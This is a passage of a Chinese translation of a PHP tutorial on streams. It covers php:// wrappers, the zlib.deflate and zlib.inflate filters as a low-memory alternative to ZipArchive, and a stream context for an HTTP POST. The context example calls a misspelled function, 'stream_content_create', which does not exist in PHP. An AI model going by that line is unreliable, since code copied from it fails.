class=\"crayon-v\">handle1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c974476112555-12\"><span class=\"crayon-e\">fclose</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">handle2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c974476112555-13\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c974476112555-14\"><span class=\"crayon-c\">// require \"memory.php\";</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p></p>\n<h3>其它流</h3>\n<p>还有其它一些流，我们可以通过管道来写入和读取（或只读取/只写入）：</p>\n<ul>\n<li>php://stdin (只读)</li>\n<li>php://stderr (只写, 如php://stdout)</li>\n<li>php://input (只读) 这使我们能够访问原始请求体</li>\n<li>php://output (只写) 让我们写入输出缓冲区</li>\n<li>php://memory 和 php://temp (读-写) 是我们可以临时存储数据的地方。 不同之处在于一旦它变得足够大 php://temp 会将数据存储在文件系统中，而 php://memory 将一直持存储在内存中直到资源耗尽。</li>\n</ul>\n<h2>过滤器</h2>\n<p>还有一个我们可以在stream上使用的技巧，称为<b>过滤器</b>。它们是一种中间的步骤，提供对stream数据的一些控制，但不把他们暴露给我们。想象一下，我们会使用Zip扩展名来压缩我们的shakespeare.txt文件。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc88c978659822309\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// from filters-1.php\r\n\r\n$zip = new ZipArchive();\r\n$filename = \"filters-1.zip\";\r\n\r\n$zip-&gt;open($filename, ZipArchive::CREATE);\r\n$zip-&gt;addFromString(\"shakespeare.txt\", file_get_contents(\"shakespeare.txt\"));\r\n$zip-&gt;close();\r\n\r\nrequire \"memory.php\";</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c978659822309-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c978659822309-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c978659822309-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c978659822309-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c978659822309-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c978659822309-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c978659822309-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c978659822309-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c978659822309-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c978659822309-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc88c978659822309-1\"><span class=\"crayon-c\">// from filters-1.php</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c978659822309-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c978659822309-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">zip</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-r\">new</span> <span class=\"crayon-e\">ZipArchive</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c978659822309-4\"><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">filename</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-s\">\"filters-1.zip\"</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c978659822309-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c978659822309-6\"><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">zip</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">open</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">filename</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-v\">ZipArchive</span><span class=\"crayon-o\">::</span><span class=\"crayon-v\">CREATE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c978659822309-7\"><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">zip</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">addFromString</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"shakespeare.txt\"</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-e\">file_get_contents</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"shakespeare.txt\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c978659822309-8\"><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">zip</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">close</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c978659822309-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c978659822309-10\"><span class=\"crayon-i\">require</span> <span class=\"crayon-s\">\"memory.php\"</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p>这是一小段整洁的代码，但它测量内存占用在10.75MB左右。使用过滤器的话，我们可以减少内存：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc88c97b028195983\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// from filters-2.php\r\n\r\n$handle1 = fopen(\r\n    \"php://filter/zlib.deflate/resource=shakespeare.txt\", \"r\"\r\n);\r\n\r\n$handle2 = fopen(\r\n    \"filters-2.deflated\", \"w\"\r\n);\r\n\r\nstream_copy_to_stream($handle1, $handle2);\r\n\r\nfclose($handle1);\r\nfclose($handle2);\r\n\r\nrequire \"memory.php\";</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c97b028195983-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c97b028195983-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c97b028195983-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c97b028195983-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c97b028195983-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c97b028195983-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c97b028195983-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c97b028195983-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c97b028195983-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c97b028195983-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c97b028195983-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c97b028195983-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c97b028195983-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c97b028195983-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c97b028195983-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c97b028195983-16\">16</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc88c97b028195983-1\"><span class=\"crayon-c\">// from filters-2.php</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c97b028195983-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c97b028195983-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">handle1</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-e\">fopen</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c97b028195983-4\">    <span class=\"crayon-s\">\"php://filter/zlib.deflate/resource=shakespeare.txt\"</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-s\">\"r\"</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c97b028195983-5\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c97b028195983-6\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c97b028195983-7\"><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">handle2</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-e\">fopen</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c97b028195983-8\">    <span class=\"crayon-s\">\"filters-2.deflated\"</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-s\">\"w\"</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c97b028195983-9\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c97b028195983-10\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c97b028195983-11\"><span class=\"crayon-e\">stream_copy_to_stream</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">handle1</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-v\">handle2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c97b028195983-12\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c97b028195983-13\"><span class=\"crayon-e\">fclose</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">handle1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c97b028195983-14\"><span class=\"crayon-e\">fclose</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">handle2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c97b028195983-15\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c97b028195983-16\"><span class=\"crayon-i\">require</span> <span class=\"crayon-s\">\"memory.php\"</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p>此处，我们可以看到名为php://filter/zlib.deflate的过滤器，它读取并压缩资源的内容。我们可以在之后将压缩数据导出到另一个文件中。这仅使用了<strong>896KB</strong>.</p>\n<p>我知道这是不一样的格式，或者制作zip存档是有好处的。你不得不怀疑：如果你可以选择不同的格式并节省约12倍的内存，为什么不选呢？</p>\n<p>为了解压此数据，我们可以通过执行另一个zlib filter将压缩后的数据还原：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc88c97e640236806\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// from filters-2.php\r\n\r\nfile_get_contents(\r\n    \"php://filter/zlib.inflate/resource=filters-2.deflated\"\r\n);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c97e640236806-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c97e640236806-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c97e640236806-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c97e640236806-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c97e640236806-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc88c97e640236806-1\"><span class=\"crayon-c\">// from filters-2.php</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c97e640236806-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c97e640236806-3\"><span class=\"crayon-e\">file_get_contents</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c97e640236806-4\">    <span class=\"crayon-s\">\"php://filter/zlib.inflate/resource=filters-2.deflated\"</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c97e640236806-5\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>Streams have been extensively covered in Stream在“<a href=\"https://www.sitepoint.com/%EF%BB%BFunderstanding-streams-in-php/\" rel=\"nofollow\">理解PHP中的流</a>”和“<a href=\"https://www.sitepoint.com/using-php-streams-effectively/\" rel=\"nofollow\">U高效使用PHP中的流</a>”中已经被全面介绍了。如果你喜欢一个完全不同的视角，可以阅读一下。</p>\n<h2>定制流</h2>\n<p>fopen和file_get_contents有它们自己的一套默认选项，但是这些都是完全可定制的。为了定义它们，我们需要创建一个新的流上下文：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc88c982455620803\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// from creating-contexts-1.php\r\n\r\n$data = join(\"&amp;\", [\r\n    \"twitter=assertchris\",\r\n]);\r\n\r\n$headers = join(\"\\r\\n\", [\r\n    \"Content-type: application/x-www-form-urlencoded\",\r\n    \"Content-length: \" . strlen($data),\r\n]);\r\n\r\n$options = [\r\n    \"http\" =&gt; [\r\n        \"method\" =&gt; \"POST\",\r\n        \"header\"=&gt; $headers,\r\n        \"content\" =&gt; $data,\r\n    ],\r\n];\r\n\r\n$context = stream_content_create($options);\r\n\r\n$handle = fopen(\"https://example.com/register\", \"r\", false, $context);\r\n$response = stream_get_contents($handle);\r\n\r\nfclose($handle);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c982455620803-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c982455620803-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c982455620803-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c982455620803-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c982455620803-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c982455620803-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c982455620803-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c982455620803-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c982455620803-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c982455620803-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c982455620803-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c982455620803-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c982455620803-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c982455620803-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c982455620803-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c982455620803-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c982455620803-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c982455620803-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c982455620803-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c982455620803-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c982455620803-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c982455620803-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c982455620803-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c982455620803-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c982455620803-25\">25</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc88c982455620803-1\"><span class=\"crayon-c\">// from creating-contexts-1.php</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c982455620803-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c982455620803-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">data</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-e\">join</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"&amp;\"</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-sy\">[</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c982455620803-4\">    <span class=\"crayon-s\">\"twitter=assertchris\"</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c982455620803-5\"><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c982455620803-6\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c982455620803-7\"><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">headers</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-e\">join</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"\\r\\n\"</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-sy\">[</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c982455620803-8\">    <span class=\"crayon-s\">\"Content-type: application/x-www-form-urlencoded\"</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c982455620803-9\">    <span class=\"crayon-s\">\"Content-length: \"</span> <span class=\"crayon-sy\">.</span> <span class=\"crayon-e\">strlen</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c982455620803-10\"><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c982455620803-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c982455620803-12\"><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">options</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-sy\">[</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c982455620803-13\">    <span class=\"crayon-s\">\"http\"</span> <span class=\"crayon-o\">=</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-sy\">[</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c982455620803-14\">        <span class=\"crayon-s\">\"method\"</span> <span class=\"crayon-o\">=</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-s\">\"POST\"</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c982455620803-15\">        <span class=\"crayon-s\">\"header\"</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-v\">headers</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c982455620803-16\">        <span class=\"crayon-s\">\"content\"</span> <span class=\"crayon-o\">=</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c982455620803-17\">    <span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c982455620803-18\"><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c982455620803-19\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c982455620803-20\"><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">context</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-e\">stream_content_create</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">options</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c982455620803-21\"> </div><div 